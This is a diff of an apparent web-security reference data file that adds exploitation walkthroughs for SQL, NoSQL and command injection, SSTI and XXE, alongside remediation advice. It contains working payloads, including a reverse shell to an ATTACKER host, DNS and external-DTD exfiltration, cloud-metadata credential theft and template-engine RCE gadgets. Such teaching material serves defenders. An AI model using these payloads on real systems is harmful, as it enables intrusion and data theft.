@@ -22,7 +22,7 @@
 */
 
 var VULNS = [
-  {
+    {
     category: "Injection",
     vulns: [
       {
@@ -31,60 +31,77 @@ var VULNS = [
         severity: "Critical",
         ref: "https://portswigger.net/web-security/sql-injection",
         description: "User input reaches a SQL query unsanitized, letting an attacker read, modify, or destroy database data — and sometimes reach the OS.",
-        brief: "SQL injection happens when user-controlled input is concatenated into a SQL query instead of being passed as a bound parameter. The database cannot tell the attacker's data from the developer's code, so a crafted value changes the query's meaning — dumping other users' rows, bypassing authentication, or, with enough privilege, reading files and running commands on the database host.\n\nIt is one of the oldest and most serious web vulnerabilities, and it remains common wherever queries are built by string concatenation. Detection, confirmation, and exploitation are heavily automated by sqlmap, but understanding the manual technique is what lets you find and confirm it reliably.",
+        brief: "SQL injection happens when user-controlled input is concatenated into a SQL query instead of being bound as a parameter. The database cannot tell the attacker's data from the developer's code, so a crafted value changes the query's meaning.\n\nImpact: dump other users' rows, bypass authentication, and — with enough database privilege — read/write files and execute commands on the database host. It remains one of the most serious and common web vulnerabilities.",
         quickReference: [
-          { label: "Break the query (error/boolean probe)", cmd: "' OR '1'='1     '--     ' OR 1=1-- -" },
-          { label: "UNION-based column count", cmd: "' ORDER BY 5-- -     ' UNION SELECT NULL,NULL,NULL-- -" },
-          { label: "Time-based blind confirmation", cmd: "'; IF(1=1) WAITFOR DELAY '0:0:5'--   (MSSQL)\n' AND SLEEP(5)-- -   (MySQL)" },
-          { label: "Automate with sqlmap", cmd: "sqlmap -r request.txt --batch --dbs" }
+          { label: "Break the query (probe)", cmd: "'   ' OR '1'='1   ' OR 1=1-- -   \" OR \"\"=\"" },
+          { label: "UNION column count", cmd: "' ORDER BY 5-- -   then  ' UNION SELECT NULL,NULL,NULL-- -" },
+          { label: "Time-based blind confirm", cmd: "' AND SLEEP(5)-- -   (MySQL)   '; WAITFOR DELAY '0:0:5'-- (MSSQL)" },
+          { label: "Automate", cmd: "sqlmap -r request.txt --batch --dbs" }
         ],
         sections: [
           {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Detect — break the query and watch the response", cmd: "# a single quote causes a 500 / SQL error / different response\nid=1'\n# boolean pair differs -> injectable:\nid=1' AND '1'='1   (normal)   vs   id=1' AND '1'='2   (empty)" },
+              { label: "2. Determine the injection type", cmd: "# error-based: the DB echoes an error containing data\n# UNION: results returned in the page -> extract directly\nid=1' ORDER BY 6-- -            # find column count (errors at N+1)\nid=-1' UNION SELECT 1,version(),database(),4,5,6-- -" },
+              { label: "3. Blind (no output) — infer with boolean or time", cmd: "# boolean: ask true/false questions\nid=1' AND SUBSTRING(version(),1,1)='8'-- -\n# time-based when nothing is reflected:\nid=1' AND IF(1=1,SLEEP(5),0)-- -" },
+              { label: "4. Automate the extraction with sqlmap", cmd: "# capture the request in Burp -> request.txt, then:\nsqlmap -r request.txt --batch --dbs\nsqlmap -r request.txt -D appdb --tables\nsqlmap -r request.txt -D appdb -T users --dump" },
+              { label: "5. Escalate beyond data (high privilege only, in scope)", cmd: "sqlmap -r request.txt --is-dba --privileges\n# MSSQL: --os-shell (xp_cmdshell)   MySQL: --file-read/--file-write (webshell)\n# stop at a proof unless full exploitation is authorised" }
+            ]
+          },
+          {
             title: "Injection Types",
             type: "table",
-            columns: ["Type", "How it manifests"],
+            columns: ["Type", "Detail"],
             rows: [
-              ["In-band (UNION)", "Results are returned in the response — extract data directly via UNION SELECT"],
-              ["Error-based", "The DB error message leaks data when the query breaks"],
-              ["Boolean blind", "No data or errors; a true/false condition changes the response subtly"],
-              ["Time blind", "No visible difference; infer true/false from a deliberate SLEEP/WAITFOR delay"],
-              ["Stacked queries", "A second statement runs after a semicolon — enables writes and, sometimes, OS commands"],
-              ["Second-order", "Input is stored, then used unsafely in a later query elsewhere in the app"]
+              ["In-band (UNION/error)", "Results or errors returned directly in the response"],
+              ["Boolean blind", "A true/false condition changes the response subtly"],
+              ["Time blind", "Infer true/false from a deliberate SLEEP/WAITFOR delay"],
+              ["Stacked queries", "A second statement after ; enables writes and sometimes RCE"],
+              ["Second-order", "Input is stored, then used unsafely in a later query"]
             ]
           },
           {
-            title: "Finding It",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Signal", "What to test"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Any parameter in a query", "IDs, filters, search, sort columns, and JSON/body fields — not just the URL"],
-              ["Single quote breaks it", "Appending ' causes a 500, a different response, or a SQL error"],
-              ["Arithmetic reflects", "id=2-1 returning the same as id=1 suggests server-side evaluation"],
-              ["Boolean pairs differ", "' AND 1=1-- vs ' AND 1=2-- produce different responses"],
-              ["ORDER BY probing", "Increasing ORDER BY n until it errors reveals the column count"]
+              ["1", "Find an injectable parameter", "Confirmed SQLi point"],
+              ["2", "Identify type + DBMS + columns", "A working extraction technique"],
+              ["3", "Dump data (users, hashes, PII)", "Sensitive data / auth bypass"],
+              ["4", "Read/write files, xp_cmdshell (if DBA)", "RCE on the DB host"]
             ]
           },
           {
-            title: "Impact",
+            title: "Tools Used",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Tool", "Purpose"],
             rows: [
-              ["Data theft", "Dump users, credentials, PII, payment data — often the whole database"],
-              ["Authentication bypass", "' OR 1=1-- in a login turns the check always-true"],
-              ["Data tampering / destruction", "UPDATE/DELETE via stacked queries"],
-              ["File read/write", "LOAD_FILE / INTO OUTFILE (MySQL), reading config or writing a webshell"],
-              ["Remote code execution", "xp_cmdshell (MSSQL) or UDF/COPY TO PROGRAM (Postgres) with high privilege"]
+              ["sqlmap", "Automated detection, extraction, and OS/file takeover"],
+              ["Burp Suite", "Manual probing, capturing the request, Intruder"],
+              ["ghauri / NoSQLMap", "Alternative injection automation"],
+              ["hashcat", "Crack dumped password hashes"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "PortSwigger — SQL injection", url: "https://portswigger.net/web-security/sql-injection" },
+              { label: "OWASP — SQL Injection Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" },
+              { label: "PayloadsAllTheThings — SQLi", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" }
             ]
           },
           {
             title: "Remediation",
             type: "notes",
             items: [
-              "Use parameterised queries / prepared statements everywhere — this is the single fix that actually works. Never build SQL by string concatenation.",
-              "Use an ORM correctly; but beware raw-query escape hatches, which reintroduce the bug.",
-              "Apply least privilege to the DB account: no FILE, no xp_cmdshell, no DBA — so a bug is not automatically RCE.",
-              "Allow-list where structure is dynamic (e.g. ORDER BY column names) — parameters cannot bind identifiers.",
-              "Input validation and a WAF are defense-in-depth, not a substitute for parameterisation."
+              "Use parameterised queries / prepared statements everywhere — the one fix that works. Never build SQL by string concatenation.",
+              "Use an ORM correctly and beware raw-query escape hatches that reintroduce the bug.",
+              "Apply least privilege to the DB account (no FILE, no xp_cmdshell, no DBA) so a bug is not automatically RCE.",
+              "Allow-list where structure is dynamic (ORDER BY column names) since parameters cannot bind identifiers.",
+              "Treat input validation and a WAF as defense-in-depth, not a substitute for parameterisation."
             ]
           }
         ]
@@ -94,59 +111,74 @@ var VULNS = [
         name: "NoSQL Injection",
         severity: "High",
         ref: "https://portswigger.net/web-security/nosql-injection",
-        description: "Operator or JavaScript injection into a NoSQL query (typically MongoDB), enabling auth bypass and data extraction.",
-        brief: "NoSQL databases do not use SQL, but they are still injectable. When user input is placed into a query object without sanitising query operators, an attacker can smuggle in operators like $ne, $gt, or $regex to change the query's logic — most famously turning a login check into one that is always true.\n\nIt is common precisely because developers who have learned to parameterise SQL often assume NoSQL is immune. It is not: the injection is into the structure of the query object, and frameworks that parse bracket or JSON notation into nested objects hand the attacker exactly that structure.",
+        description: "Operator or JavaScript injection into a NoSQL query (typically MongoDB), enabling authentication bypass and data extraction.",
+        brief: "NoSQL databases are still injectable. When user input is placed into a query object without sanitising query operators, an attacker smuggles in operators like $ne, $gt, or $regex to change the query's logic — most famously turning a login check into one that is always true.\n\nImpact: authentication bypass in a single request, blind extraction of secrets character by character, and — via $where / mapReduce — server-side code execution. It is common because developers assume NoSQL is immune to injection.",
         quickReference: [
           { label: "Auth bypass (JSON body)", cmd: "{\"user\":\"admin\",\"pass\":{\"$ne\":\"x\"}}" },
           { label: "Auth bypass (form / URL)", cmd: "user[$ne]=x&pass[$ne]=x" },
-          { label: "Blind extraction with regex", cmd: "pass[$regex]=^a   pass[$regex]=^b  ...  (walk each char)" },
-          { label: "Server-side JS injection", cmd: "$where: \"this.pass == this.pass\"   // always true" }
+          { label: "Blind extraction", cmd: "pass[$regex]=^a   pass[$regex]=^b  ... (walk each char)" },
+          { label: "Automate", cmd: "nosqli scan -t 'https://target/search?q=test'" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Authentication bypass — send an operator instead of a value", cmd: "# in Burp, change the login body from a string to an operator object:\n#   {\"user\":\"admin\",\"pass\":\"x\"}   ->   {\"user\":\"admin\",\"pass\":{\"$ne\":\"x\"}}\n# 'password not equal to x' is true for any real password -> logged in" },
+              { label: "2. Form/URL variant (bracket notation parses to an object)", cmd: "# Express/PHP turn param[$ne]=x into { param: { $ne: 'x' } }\ncurl 'https://target/login' -d 'user[$ne]=x&pass[$ne]=x'" },
+              { label: "3. Blind data extraction with $regex", cmd: "# response differs when the pattern matches -> extract a secret char by char\npass[$regex]=^a   # false\npass[$regex]=^s   # true -> first char is 's', continue ^se, ^sec ...\n# automate the walk with a script or nosqli" },
+              { label: "4. Server-side JavaScript via $where", cmd: "# where the app builds a $where/mapReduce from input:\n{\"$where\": \"this.pass == this.pass\"}   # always true\n# these can reach code execution on the DB" },
+              { label: "5. Automate detection", cmd: "nosqli scan -t 'https://target/search?q=test'\nnosqli scan -t https://target/login -r POST -d '{\"user\":\"a\",\"pass\":\"b\"}'" }
+            ]
+          },
           {
             title: "Operators Abused",
             type: "table",
             columns: ["Operator", "Effect"],
             rows: [
-              ["$ne", "Not equal — 'password not equal to x' is true for any real password"],
-              ["$gt / $lt", "Greater/less than — another always-true trick"],
-              ["$regex", "Pattern match — extract a value one character at a time (blind)"],
-              ["$where", "Evaluate a JavaScript expression server-side — path to code execution"],
-              ["$in / $exists", "Match any value in a list / test whether a field exists"]
+              ["$ne / $gt / $lt", "Always-true comparisons → auth bypass"],
+              ["$regex", "Pattern match → blind character-by-character extraction"],
+              ["$where", "Server-side JavaScript → path to code execution"],
+              ["$in / $exists", "Match any of a list / test field presence"]
             ]
           },
           {
-            title: "Finding It",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Test", "Indicator"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Send an operator object", "{\"$ne\":null} in place of a string logs you in or changes results"],
-              ["Bracket notation", "param[$ne]=x works because Express/PHP parse it into a nested object"],
-              ["Break the query", "Injecting ' or \" or a stray } causes a different error than SQL would"],
-              ["Boolean regex", "pass[$regex]=^a vs ^z produce different responses on a real value"],
-              ["Tooling", "nosqli scan confirms injectable parameters and the working operator"]
+              ["1", "Send an operator where a value is expected", "Confirm injection / auth bypass"],
+              ["2", "Use $regex to extract secrets", "Passwords / tokens recovered"],
+              ["3", "Reach $where / mapReduce if present", "Server-side code execution"]
             ]
           },
           {
-            title: "Impact",
+            title: "Tools Used",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Tool", "Purpose"],
             rows: [
-              ["Authentication bypass", "The canonical one-request win against a NoSQL login"],
-              ["Data extraction", "Blind $regex extraction of passwords and secrets, character by character"],
-              ["Query logic tampering", "Return records you should not see, or all records"],
-              ["Code execution", "$where / mapReduce evaluate server-side JavaScript"]
+              ["nosqli", "Maintained NoSQL injection scanner (MongoDB)"],
+              ["Burp Suite", "Manual operator injection and testing"],
+              ["custom scripts", "Automate $regex blind extraction"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "PortSwigger — NoSQL injection", url: "https://portswigger.net/web-security/nosql-injection" },
+              { label: "PayloadsAllTheThings — NoSQL Injection", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection" }
             ]
           },
           {
             title: "Remediation",
             type: "notes",
             items: [
-              "Validate input types strictly — expect a string where a string belongs, and reject objects/arrays that arrive where a scalar is expected.",
-              "Cast user input to the expected type before it reaches the query; a password should never be allowed to be an object.",
-              "Disable server-side JavaScript ($where, mapReduce) in MongoDB unless genuinely required.",
-              "Use the database driver's query builders rather than passing raw user-controlled objects into queries.",
-              "Never expose an unauthenticated MongoDB to the network — a bound-to-0.0.0.0 instance is a direct-dump risk regardless of injection."
+              "Validate input types strictly — reject objects/arrays where a scalar (string) is expected.",
+              "Cast user input to the expected type before it reaches the query; a password must never be allowed to be an object.",
+              "Disable server-side JavaScript ($where, mapReduce) unless genuinely required.",
+              "Use the driver's query builders instead of passing raw user-controlled objects into queries.",
+              "Never expose an unauthenticated MongoDB to the network."
             ]
           }
         ]
@@ -157,58 +189,75 @@ var VULNS = [
         severity: "Critical",
         ref: "https://portswigger.net/web-security/os-command-injection",
         description: "User input reaches a system shell command, letting an attacker run arbitrary commands on the server.",
-        brief: "Command injection occurs when an application builds an operating-system command using unsanitised user input and passes it to a shell. Shell metacharacters (;, |, &, `, $()) let the attacker append or substitute their own commands, which run with the privileges of the web process — direct code execution on the host.\n\nIt is high severity by nature and shows up wherever an app shells out: ping/traceroute tools, file converters, image/PDF processors, backup and export features, and any 'run diagnostics' button.",
+        brief: "Command injection occurs when an application builds an OS command from unsanitised input and passes it to a shell. Shell metacharacters (;, |, &, `, $()) let the attacker append or substitute their own commands, which run with the web process's privileges.\n\nImpact: direct code execution on the host — read secrets, pivot internally, and take full control. It appears wherever an app shells out: ping/traceroute tools, file/PDF/image converters, backup and export features.",
         quickReference: [
-          { label: "Separators to chain a command", cmd: "; id     | id     & id     && id     %0a id" },
-          { label: "Inline substitution", cmd: "$(id)     `id`" },
-          { label: "Blind confirmation (OOB)", cmd: "; nslookup $(whoami).attacker.oastify.com" },
-          { label: "Blind time-based", cmd: "; ping -c 5 127.0.0.1     ; sleep 5" }
+          { label: "Command separators", cmd: "; id    | id    & id    && id    %0a id" },
+          { label: "Inline substitution", cmd: "$(id)    `id`" },
+          { label: "Blind out-of-band confirm", cmd: "; nslookup $(whoami).attacker.oastify.com" },
+          { label: "Blind time-based", cmd: "; ping -c 5 127.0.0.1   ; sleep 5" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Suspect any feature that shells out", cmd: "# ping/nslookup/whois tools, file converters, pdf/image processing, zip/tar,\n# git operations, 'run diagnostics' buttons -> prime candidates\nhost=127.0.0.1; id   # append a command to a ping parameter" },
+              { label: "2. Results-based — see command output in the response", cmd: "host=127.0.0.1; id\nhost=127.0.0.1 | whoami\nhost=127.0.0.1 && cat /etc/passwd" },
+              { label: "3. Blind time-based — no output, infer from delay", cmd: "host=127.0.0.1; sleep 5     # response delayed 5s = injectable\nhost=127.0.0.1; ping -c 5 127.0.0.1" },
+              { label: "4. Blind out-of-band — trigger a callback", cmd: "host=127.0.0.1; nslookup $(whoami).oob.attacker.com\n# a DNS/HTTP hit on your Collaborator/OAST host confirms + exfils output" },
+              { label: "5. Automate + escalate to a shell", cmd: "commix -u 'https://target/tools/ping?host=127.0.0.1' --level 2\n# then a reverse shell (in scope): ; bash -c 'bash -i >& /dev/tcp/ATTACKER/443 0>&1'" }
+            ]
+          },
           {
             title: "Injection Contexts",
             type: "table",
             columns: ["Context", "Break-out"],
             rows: [
-              ["Unquoted argument", "Any separator works: ; | & && ||"],
-              ["Inside double quotes", "$(cmd) and `cmd` still execute; \" to break out"],
+              ["Unquoted argument", "Any separator: ; | & && ||"],
+              ["Inside double quotes", "$(cmd) / `cmd` still execute"],
               ["Inside single quotes", "Close the quote first: ' then the payload"],
-              ["Newline-sensitive parsers", "%0a (newline) injects a new command line"],
-              ["Argument injection", "Even without a separator, extra flags (e.g. -o) can change behaviour dangerously"]
+              ["Newline-sensitive parsers", "%0a injects a new command line"],
+              ["Argument injection", "Extra flags (e.g. -o) change behaviour without a separator"]
             ]
           },
           {
-            title: "Finding It",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Signal", "Approach"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Shell-adjacent features", "ping, nslookup, whois, convert, zip/tar, pdf/image tools, git operations"],
-              ["Results-based", "Append ; id and look for command output in the response"],
-              ["Blind time-based", "Inject a sleep/ping and measure the response delay"],
-              ["Blind out-of-band", "Trigger a DNS/HTTP callback to a Collaborator/OAST host"],
-              ["Tooling", "Commix automates detection and exploitation across these techniques"]
+              ["1", "Find a shell-adjacent feature", "Candidate injection point"],
+              ["2", "Confirm (output / delay / OOB)", "Verified command execution"],
+              ["3", "Run a reverse shell", "Interactive access as the web user"],
+              ["4", "Escalate / pivot internally", "Host and network compromise"]
             ]
           },
           {
-            title: "Impact",
+            title: "Tools Used",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Tool", "Purpose"],
             rows: [
-              ["Remote code execution", "Arbitrary commands as the web process user"],
-              ["Full host compromise", "Read secrets, pivot internally, add persistence"],
-              ["Data exfiltration", "Read files, dump env vars and cloud metadata"],
-              ["Lateral movement", "Reach internal services from the compromised host"]
+              ["Commix", "Automated command-injection detection and exploitation"],
+              ["Burp Suite (Collaborator)", "Manual testing and blind OOB detection"],
+              ["Interactsh / OAST", "Out-of-band confirmation for blind cases"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "PortSwigger — OS command injection", url: "https://portswigger.net/web-security/os-command-injection" },
+              { label: "PayloadsAllTheThings — Command Injection", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection" }
             ]
           },
           {
             title: "Remediation",
             type: "notes",
             items: [
-              "Avoid calling the shell entirely — use language APIs (e.g. a DNS library instead of shelling out to nslookup).",
-              "If you must run a binary, use an exec form that passes arguments as an array (execve-style), never a single shell string.",
-              "Never pass user input as part of the command; where a value must be passed, validate against a strict allow-list.",
-              "Run the web process with least privilege so a foothold is contained.",
-              "A WAF may block obvious payloads but is trivially bypassed — fix the code, do not rely on filtering."
+              "Avoid calling the shell — use language APIs (e.g. a DNS library instead of nslookup).",
+              "If you must run a binary, use an exec form that passes arguments as an array, never a single shell string.",
+              "Never pass user input into the command; where a value is required, validate against a strict allow-list.",
+              "Run the web process with least privilege to contain a foothold.",
+              "Fix the code — a WAF blocking obvious payloads is trivially bypassed."
             ]
           }
         ]
@@ -219,58 +268,74 @@ var VULNS = [
         severity: "Critical",
         ref: "https://portswigger.net/web-security/server-side-template-injection",
         description: "User input is evaluated by a server-side template engine, often escalating to remote code execution.",
-        brief: "SSTI happens when user input is embedded into a template that is then rendered server-side, so the input is interpreted as template code rather than data. Because template engines are small language interpreters, this usually escalates from information disclosure to full command execution via documented sandbox escapes.\n\nIt is increasingly common as applications build emails, pages, and documents from templates with user-controlled fields (names, subjects, profile data). The tell is simple: a math expression in the template syntax gets evaluated.",
+        brief: "SSTI happens when user input is embedded into a template rendered server-side, so it is interpreted as template code rather than data. Because template engines are small interpreters, this usually escalates from information disclosure to full command execution via documented sandbox escapes.\n\nImpact: RCE on the server. It is increasingly common as apps build emails, pages, and documents from templates with user-controlled fields. The tell is that a math expression in the template syntax gets evaluated.",
         quickReference: [
-          { label: "Detection probes", cmd: "{{7*7}}   ${7*7}   <%= 7*7 %>   #{7*7}   {7*7}   -> look for 49" },
-          { label: "Polyglot probe", cmd: "${{<%[%'\"}}%\\" },
+          { label: "Detection probes", cmd: "{{7*7}}  ${7*7}  <%= 7*7 %>  #{7*7}  {7*7}  -> look for 49" },
+          { label: "Distinguish Jinja2 vs Twig", cmd: "{{7*'7'}}  -> 7777777 (Jinja2) or 49 (Twig)" },
           { label: "Jinja2 RCE (concept)", cmd: "{{ cycler.__init__.__globals__.os.popen('id').read() }}" },
-          { label: "Automate", cmd: "python3 sstimap.py -u \"https://target/page?name=x\" --os-shell" }
+          { label: "Automate", cmd: "python3 sstimap.py -u 'https://target/page?name=x' --os-shell" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Detect — inject a math probe in each reflected field", cmd: "# names, subjects, profile fields, error messages\nname={{7*7}}     # rendered 49 = server-side evaluation (not XSS)\nname=${7*7}      # dollar-brace engines\nname=<%= 7*7 %>  # ERB" },
+              { label: "2. Fingerprint the engine", cmd: "{{7*'7'}}  ->  7777777 means Jinja2 (Python), 49 means Twig (PHP)\n# match the rendered result to the engine, then use that engine's escape" },
+              { label: "3. Jinja2 escape to RCE (sandbox breakout)", cmd: "{{ ''.__class__.__mro__[1].__subclasses__() }}   # enumerate classes\n{{ cycler.__init__.__globals__.os.popen('id').read() }}   # execute" },
+              { label: "4. Other engines' exec paths", cmd: "# Twig:      {{['id']|filter('system')}}\n# Freemarker:${'freemarker.template.utility.Execute'?new()('id')}\n# Velocity/Smarty have documented exec gadgets too" },
+              { label: "5. Automate + get a shell", cmd: "python3 sstimap.py -u 'https://target/greet?name=x' --os-cmd id\npython3 sstimap.py -u 'https://target/greet?name=x' --os-shell" }
+            ]
+          },
           {
             title: "Engine Fingerprint",
             type: "table",
             columns: ["Rendered probe", "Likely engine"],
             rows: [
-              ["{{7*7}} -> 49", "Jinja2 (Python), Twig (PHP)"],
-              ["${7*7} -> 49", "Freemarker, Velocity (Java)"],
-              ["<%= 7*7 %> -> 49", "ERB (Ruby)"],
-              ["#{7*7} -> 49", "Some Ruby / Thymeleaf variants"],
-              ["{7*7} -> 49", "Smarty (PHP)"],
-              ["{{7*'7'}} -> 7777777", "Distinguishes Jinja2 (repeats) from Twig (49)"]
+              ["{{7*7}} → 49", "Jinja2 (Python), Twig (PHP)"],
+              ["${7*7} → 49", "Freemarker, Velocity (Java)"],
+              ["<%= 7*7 %> → 49", "ERB (Ruby)"],
+              ["{7*7} → 49", "Smarty (PHP)"],
+              ["{{7*'7'}} → 7777777", "Jinja2 (repeats) vs Twig (49)"]
             ]
           },
           {
-            title: "Why It Escalates to RCE",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Mechanism", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Templates run code", "The engine evaluates expressions server-side"],
-              ["Sandbox escape", "Jinja2/Twig escapes reach language internals (os, Runtime) then a shell"],
-              ["Built-in exec", "Freemarker/Velocity expose classes that run OS commands directly"],
-              ["Minimum impact", "Even without RCE, SSTI leaks config, environment, and internal objects"]
+              ["1", "Reflect a math probe", "Confirm server-side evaluation"],
+              ["2", "Fingerprint the engine", "The correct escape chain"],
+              ["3", "Escape the sandbox to language internals", "Access to os/Runtime"],
+              ["4", "Execute OS commands", "RCE on the server"]
             ]
           },
           {
-            title: "Finding It",
+            title: "Tools Used",
             type: "table",
-            columns: ["Step", "Detail"],
+            columns: ["Tool", "Purpose"],
             rows: [
-              ["Reflect a math probe", "Any field echoed back — names, subjects, profile fields, error messages"],
-              ["Confirm evaluation", "49 (not '7*7') means server-side evaluation, not plain reflection"],
-              ["Distinguish from XSS", "XSS reflects your markup; SSTI computes your expression"],
-              ["Identify engine", "Use the fingerprint table, then apply that engine's escape chain"]
+              ["SSTImap", "Detect and exploit SSTI to RCE across engines"],
+              ["Burp Suite", "Manual probing and reflection analysis"],
+              ["tplmap (legacy)", "Older automation; SSTImap is the maintained successor"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "PortSwigger — Server-side template injection", url: "https://portswigger.net/web-security/server-side-template-injection" },
+              { label: "PayloadsAllTheThings — SSTI", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" }
             ]
           },
           {
             title: "Remediation",
             type: "notes",
             items: [
-              "Never pass user input into the template string itself; pass it as rendering data/context, which the engine treats as inert values.",
-              "Use a logic-less or sandboxed template engine where possible, and keep the sandbox enabled.",
+              "Never pass user input into the template string; pass it as rendering data/context, which the engine treats as inert.",
+              "Use a logic-less or sandboxed engine and keep the sandbox enabled and updated.",
               "Validate and allow-list any input that must influence template selection.",
-              "Treat confirmed SSTI as potential RCE and prioritise accordingly; stop exploitation at a benign proof (id) unless in scope.",
-              "Keep template engines updated — sandbox-escape bypasses are patched over time."
+              "Treat confirmed SSTI as potential RCE; stop exploitation at a benign proof (id) unless in scope."
             ]
           }
         ]
@@ -281,57 +346,74 @@ var VULNS = [
         severity: "High",
         ref: "https://portswigger.net/web-security/xxe",
         description: "An XML parser processes attacker-defined external entities, enabling file read, SSRF, and sometimes RCE.",
-        brief: "XXE arises when an application parses XML that permits external entity definitions and does not disable them. An attacker defines an entity that points at a local file or an internal URL; when the parser expands it, the contents are pulled into the response or sent to a server the attacker controls.\n\nIt turns an XML input — SOAP, SAML, document uploads (DOCX/SVG/XML), or any XML API — into a file-read and SSRF primitive, and in some parser configurations into denial of service or code execution.",
+        brief: "XXE arises when an application parses XML that permits external entity definitions and does not disable them. An attacker defines an entity pointing at a local file or internal URL; when the parser expands it, the contents are pulled into the response or sent to a server the attacker controls.\n\nImpact: local file disclosure (source, config, keys), SSRF to internal services and cloud metadata, denial of service, and occasionally RCE. Any XML input is a candidate — SOAP, SAML, and document uploads (DOCX/SVG/XLSX).",
         quickReference: [
-          { label: "Classic file read", cmd: "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]>\n<r>&x;</r>" },
+          { label: "Classic file read", cmd: "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>" },
           { label: "SSRF via entity", cmd: "<!ENTITY x SYSTEM \"http://169.254.169.254/latest/meta-data/\">" },
-          { label: "Blind / OOB exfiltration", cmd: "<!ENTITY % x SYSTEM \"http://attacker/evil.dtd\">  (external DTD chains the leak)" },
-          { label: "Where to inject", cmd: "Any XML body, file upload (SVG/DOCX/XLSX), SAML, SOAP" }
+          { label: "Blind OOB (external DTD)", cmd: "<!ENTITY % x SYSTEM \"http://attacker/evil.dtd\">" },
+          { label: "Where to inject", cmd: "Any XML body, SVG/DOCX/XLSX upload, SAML, SOAP" }
         ],
         sections: [
           {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. In-band file read", cmd: "<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root><data>&xxe;</data></root>\n# the file contents appear where &xxe; is reflected" },
+              { label: "2. SSRF — reach internal services / cloud metadata", cmd: "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]>\n<root>&xxe;</root>   # returns IAM creds in AWS" },
+              { label: "3. Blind (no reflection) — exfil via an external DTD", cmd: "# host evil.dtd on your server:\n#   <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n#   <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?x=%file;'>\">\n#   %eval; %exfil;\n# payload:\n<!DOCTYPE r [<!ENTITY % x SYSTEM \"http://attacker/evil.dtd\"> %x;]>" },
+              { label: "4. File uploads that are XML underneath", cmd: "# SVG, DOCX, XLSX are XML -> embed the DOCTYPE/entity in the file's XML and upload\n# e.g. a malicious .svg processed server-side leaks files" },
+              { label: "5. Confirm blind with an OOB callback", cmd: "<!DOCTYPE r [<!ENTITY x SYSTEM \"http://YOUR-COLLAB.oastify.com\">]><r>&x;</r>\n# a hit proves the parser fetches external entities" }
+            ]
+          },
+          {
             title: "Variants",
             type: "table",
-            columns: ["Variant", "Description"],
+            columns: ["Variant", "Detail"],
             rows: [
-              ["In-band file read", "The entity's contents appear directly in the response"],
-              ["Blind (out-of-band)", "No reflection; exfiltrate via an external DTD that sends data to your server"],
-              ["Error-based", "Provoke a parser error that embeds the file contents in the error message"],
-              ["SSRF", "Point the entity at internal services or cloud metadata endpoints"],
-              ["Billion Laughs (DoS)", "Nested entities expand exponentially and exhaust memory"]
+              ["In-band read", "Entity contents appear in the response"],
+              ["Blind OOB", "Exfiltrate via an external DTD to your server"],
+              ["Error-based", "Provoke a parser error embedding the file contents"],
+              ["SSRF", "Point the entity at internal services / metadata"],
+              ["Billion Laughs (DoS)", "Nested entities expand exponentially"]
             ]
           },
           {
-            title: "Finding It",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Signal", "Approach"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["XML anywhere", "Content-Type application/xml, SOAP endpoints, SAML, RSS, config imports"],
-              ["File uploads", "Office docs, SVG, and many formats are XML under the hood"],
-              ["Reflected entity", "Define a benign entity and see if it expands in the response"],
-              ["OOB callback", "Use an external entity pointing to a Collaborator host to catch blind cases"]
+              ["1", "Find XML input (body/upload/SAML)", "Candidate parser"],
+              ["2", "Inject a benign entity / OOB probe", "Confirm external-entity processing"],
+              ["3", "Read files or reach internal URLs", "Secret disclosure / SSRF"],
+              ["4", "Chain SSRF to cloud metadata", "Credential theft → wider compromise"]
             ]
           },
           {
-            title: "Impact",
+            title: "Tools Used",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Tool", "Purpose"],
             rows: [
-              ["Local file disclosure", "Read /etc/passwd, source code, config files, keys"],
-              ["SSRF", "Reach internal-only services and cloud metadata (credentials)"],
-              ["Denial of service", "Entity-expansion attacks crash the parser"],
-              ["RCE (rare)", "Via the PHP expect:// wrapper or specific parser features"]
+              ["Burp Suite (+ Collaborator)", "Manual injection and blind OOB detection"],
+              ["XXEinjector", "Automated file retrieval via XXE"],
+              ["oxml_xxe / docem", "Embed XXE into Office/SVG documents"]
+            ]
